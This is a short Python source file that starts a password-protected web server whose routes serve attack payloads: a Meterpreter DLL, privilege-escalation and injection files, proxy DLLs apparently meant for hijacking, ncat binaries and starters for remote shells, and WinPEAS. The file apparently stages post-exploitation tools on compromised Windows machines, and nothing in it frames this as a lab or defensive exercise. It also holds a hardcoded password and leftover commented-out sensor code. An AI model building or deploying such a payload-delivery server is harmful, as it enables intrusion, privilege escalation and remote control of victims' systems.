import sys
sys.path.append('./lib')


from WebServer import WebServer
from filereader import *

import uasyncio as asyncio
import _thread
import os


def run_ws():
    # Start ws.py as separate process thread-safe
    os.system("python3 ws.py")


async def run_tasks_concurrently():

    server = WebServer(
	storage="./Storage/storage.txt",
        password="BarackOvirus"
    )

    getdirectories = [
	("/meterpreter", "./Files/meterpreter.dll", "text/html", False, True),
	("/win_start", "./Files/win_start.cmd", "text/html", False, True),
	("/elevate", "./Files/elevate.cmd", "text/html", False, True),
	("/load_mapper", "./Files/load_mapper.exe", "text/html", False, True),
    ("/mapper", "./Files/mapper.dll", "text/html", False, True),
	("/start_process", "./Files/start_process.dll", "text/html", False, True),
    ("/directmanipulation_proxy", "./Files/directmanipulation_proxy.dll", "text/html", False, True),
	("/directmanipulation_proxy27", "./Files/directmanipulation_proxy27.dll", "text/html", False, True),
    ("/winpeas", "./Files/winPeas.bat", "text/html", False, False),
	("/inject", "./Files/inject.dll", "text/html", False, True),
	("/ncat.cmd", "./Files/ncat.cmd", "text/html", False, False),
	("/ncat", "./Files/ncat.exe", "text/html", False, True),
	("/msgbox", "./Files/msgbox.dll", "text/html", False, True),
	("/mapper_args", "./Files/mapper_args.dll", "text/html", False, True),
	("/ncatStarter", "./Files/ncatStarter.exe", "text/html", False, True)
    ]

    # Run BLE connection and WebServer in parallel
    #asyncio.create_task(bluetooth_sensor.connect_to_device())
    asyncio.create_task(server.start(getdirectories, "./Files/Instructions.html"))

    # Wait for accelerometer data but don't block execution
    #while bluetooth_sensor.connection is None:
        #await asyncio.sleep(1)  # Yield to event loop

    # Start listening for accelerometer data
    #asyncio.create_task(bluetooth_sensor.acceleratometer(bluetooth_sensor.connection, server.store))

    # Keep event loop alive
    #_thread.start_new_thread(run_ws, ())
    while True:
        await asyncio.sleep(1)

asyncio.run(run_tasks_concurrently())




   
